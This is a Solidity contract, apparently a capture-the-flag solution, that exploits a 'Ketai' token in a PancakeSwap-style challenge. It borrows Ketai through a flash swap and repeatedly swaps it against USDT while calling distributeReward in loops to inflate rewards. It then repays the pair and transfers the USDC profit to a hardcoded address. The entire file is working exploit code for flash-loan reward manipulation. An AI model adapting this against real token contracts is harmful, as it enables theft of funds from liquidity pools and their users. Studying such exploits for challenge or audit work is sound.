// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Challenge.sol";

contract Exploitor {
    IPancakeFactory factory;
    IPancakeRouter02 router;
    Challenge challenge;
    USDT usdt;
    USDC usdc;
    Ketai ketai;
    uint256 loanAmount;
    uint8 roundCount;

    constructor(Challenge _challenge) {
        challenge = _challenge;
        factory = challenge.factory();
        router = challenge.router();
        usdt = challenge.usdt();
        usdc = challenge.usdc();
        ketai = challenge.ketai();
    }

    function exploit(uint8 _roundCount) public payable {
        roundCount = _roundCount;
        PancakePair kcPair = PancakePair(
            factory.getPair(address(usdc), address(ketai))
        );

        uint256 a0out;
        uint256 a1out;
        loanAmount = ketai.balanceOf(address(kcPair)) - 1;
        (a0out, a1out) = address(usdc) < address(ketai)
            ? (uint256(0), loanAmount)
            : (uint256(loanAmount), uint256(0));
        kcPair.swap(a0out, a1out, address(this), "123");

        address[] memory path = new address[](2);
        path[0] = address(ketai);
        path[1] = address(usdc);
        ketai.approve(address(router), ketai.balanceOf(address(this)));
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ketai.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
        usdc.transfer(address(0xf2331a2d), usdc.balanceOf(address(this)));
        // assert(challenge.isSolved());
    }

    function pancakeCall(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        for (uint i = 0; i < roundCount; i++) {
            address[] memory path1 = new address[](2);
            path1[0] = address(ketai);
            path1[1] = address(usdt);
            ketai.approve(address(router), ketai.balanceOf(address(this)));
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                ketai.balanceOf(address(this)),
                0,
                path1,
                address(this),
                block.timestamp
            );
            for (uint j = 0; j < 10; j++) {
                ketai.distributeReward();
            }

            address[] memory path2 = new address[](2);
            path2[0] = address(usdt);
            path2[1] = address(ketai);
            usdt.approve(address(router), usdt.balanceOf(address(this)));
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                usdt.balanceOf(address(this)),
                0,
                path2,
                address(this),
                block.timestamp
            );
        }

        PancakePair kcPair = PancakePair(
            factory.getPair(address(usdc), address(ketai))
        );
        ketai.transfer(address(kcPair), uint256(loanAmount * 2));
    }
}
